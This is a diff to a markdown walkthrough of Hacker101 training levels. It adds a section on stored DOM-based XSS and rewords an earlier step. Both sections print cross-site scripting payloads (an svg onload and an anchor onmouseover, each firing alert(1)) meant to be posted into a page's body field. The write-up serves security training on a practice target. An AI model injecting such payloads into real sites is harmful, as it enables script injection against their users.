@@ -38,11 +38,21 @@ Look at script at bottom of page source:
 
 ## Stored XSS (Body)
 
-Enter payload into body and POST     
+Enter payload into page body edit box and POST     
 `"<svg onload=alert(1)>`
 
 ![Stored XSS in Body](https://github.com/Isopach/Hacker101/blob/master/img/level3_stored_xss_body.png)
 
+---
+
+## Stored XSS (Body, DOM)
+
+Enter payload into page body edit box and POST    
+`<a href="https://levels-a.hacker101.com/levels/3/#" onmouseover=alert(1)`   
+
+![Stored_XSS_in_Body_DOM](https://github.com/Isopach/Hacker101/blob/master/img/level3_stored_xss_body_dom.png)
+
+---
 
 ## Self XSS (Head)
 
